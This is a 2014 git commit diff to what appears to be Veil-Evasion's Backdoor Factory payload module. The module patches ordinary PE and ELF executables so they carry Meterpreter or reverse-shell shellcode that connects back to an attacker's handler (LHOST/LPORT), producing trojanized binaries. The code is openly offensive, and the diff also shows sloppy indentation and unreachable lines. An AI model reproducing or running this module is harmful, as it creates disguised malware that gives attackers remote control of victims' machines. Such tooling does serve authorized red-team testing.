3fb5e49f27cda78d8705a43e3e6b23b75bb2a31a
secretsquirrel <the.midnite.runr@gmail.com>
2014-02-16 13:51:28 -0500

    updates to support new backdoor factory

--- modules/payloads/native/backdoor_factory.py
+++ modules/payloads/native/backdoor_factory.py
@@ -8,9 +8,11 @@ More information from
 """
 
 import sys, time, subprocess
-
+import shutil
 from modules.common import helpers
 from modules.common import shellcode
+from tools.backdoor import pebin
+from tools.backdoor import elfbin
 
 # the main config file
 import settings
@@ -19,22 +21,48 @@ class Payload:
 
     def __init__(self):
         # required options
-        self.description = "Automates running of the BackdoorFactory"
-        self.language = "native"
+        self.description = "Import of the BackdoorFactory"
+        self.description +=" Supports PE and ELF file formats"
+	self.description +=" Author: Joshua Pitts @midnite_runr"
+	self.language = "native"
         self.rating = "Normal"
-        self.extension = "exe"
-
+	self.extension = ""
+	self.type = ""
         self.shellcode = shellcode.Shellcode()
 
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"original_exe"     : ["psinfo.exe", "The executable to run Backdoor Factory on"],
-                                 "payload"          : ["meter_tcp","meter_tcp, meter_https, rev_shell, custom"],
+        self.required_options = {"orig_exe"     : ["psinfo.exe", "PE or ELF executable to run through the Backdoor Factory"],
+                                 "payload"          : ["meter_tcp","PE or ELF: meter_tcp, rev_shell, custom | PE only meter_https"],
                                  "LHOST"            : ["127.0.0.1", "IP of the metasploit handler"],
                                  "LPORT"            : ["4444", "Port of the metasploit handler"]}
 
-    def generate(self):
 
-        if self.required_options["payload"][0] == "custom":
+    def basicDiscovery(self):
+        testBinary = open(self.required_options["orig_exe"][0], 'rb')
+	header = testBinary.read(8)
+	testBinary.close()
+	if 'MZ' in header:
+	    self.type = 'PE'
+	elif 'ELF' in header:
+	    self.type = 'ELF'
+	else:
+	    raise IOError
+            print "\nBDF only supports intel 32/64bit PE and ELF binaries:\n" + helpers.color(stdout, warning=True)
+            raw_input("\n[>] Press any key to return to the main menu:")
+            return ""
+
+
+
+    def generate(self):
+	#Because of calling BDF via classes, obsolute paths change
+	if self.required_options["orig_exe"][0] == "psinfo.exe":
+	   self.required_options["orig_exe"][0] = settings.VEIL_EVASION_PATH + "testbins/psinfo.exe"
+	
+	#Make sure the bin is supported
+	self.basicDiscovery()
+
+           
+	if self.required_options["payload"][0] == "custom":
 
             Shellcode = self.shellcode.generate()
 
@@ -43,15 +71,22 @@ class Payload:
             f = open(settings.TEMP_DIR + "shellcode.raw", 'wb')
             f.write(raw)
             f.close()
-
-            backdoorCommand = "./backdoor.py -f " + self.required_options["orig_exe"][0] + " -o payload.exe -s user_supplied_shellcode -U " + settings.TEMP_DIR + "shellcode.raw"
+	    print "shellcode", settings.TEMP_DIR + "shellcode.raw"
+	    #invoke the class for the associated binary
+	    if self.type == 'PE':
+		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
+                self.extension = "exe"
+	    
+	    else:
+		targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw") 
+        	self.extension = ""
 
         else:
 
             shellcodeChoice = ""
             if self.required_options["payload"][0] == "meter_tcp":
                 shellcodeChoice = "reverse_tcp_stager"
-            elif self.required_options["payload"][0] == "meter_https":
+            elif self.required_options["payload"][0] == "meter_https" and self.type == "PE":
                 shellcodeChoice = "meterpreter_reverse_https"
             elif self.required_options["payload"][0] == "rev_shell":
                 shellcodeChoice = "reverse_shell_tcp"
@@ -60,23 +95,40 @@ class Payload:
                 raw_input("\n [>] Press any key to return to the main menu:")
                 return ""
 
-            # the command to invoke the backdoor factory
-            backdoorCommand = "./backdoor.py -f " + self.required_options["orig_exe"][0] + " -o payload.exe -s " + shellcodeChoice + " -H " + self.required_options["LHOST"][0] + " -P " + self.required_options["LPORT"][0]
+            # invoke the class for the associated binary
+	    if self.type == 'PE':
+		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0]))
+            	self.extension = "exe"
+	    else:
+                targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe',  SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0])) 
+		self.extension = ""
 
-        print helpers.color("\n [*] Running The Backdoor Factory...")
-
-        # be sure to set 'cwd' to the proper directory for hyperion so it properly runs
-        p = subprocess.Popen(backdoorCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=settings.VEIL_EVASION_PATH+"tools/backdoor/", shell=True)
-        stdout, stderr = p.communicate()
+        print helpers.color("\n[*] Running The Backdoor Factory...")
 
         try:
-            # read in the output .exe from /tmp/
-            f = open(settings.VEIL_EVASION_PATH+"tools/backdoor/backdoored/payload.exe", 'rb')
+	    #PATCH STUFF
+	    targetFile.run_this()
+            
+	    #Because shits fast yo
+	    time.sleep(4)
+	    
+	    # read in the output .exe from /tmp/
+            f = open(settings.VEIL_EVASION_PATH+"backdoored/payload.exe", 'rb')
             PayloadCode = f.read()
             f.close()
+
         except IOError:
             print "\nError during The Backdoor Factory execution:\n" + helpers.color(stdout, warning=True)
             raw_input("\n[>] Press any key to return to the main menu:")
             return ""
 
-        return PayloadCode
+	try:
+	    #remove backdoored/ in VEIL root
+	    shutil.rmtree(settings.VEIL_EVASION_PATH+'backdoored')
+
+        except Exception as e:
+	    print str(e)
+	    #quiet failure
+	    pass
+
+	return PayloadCode
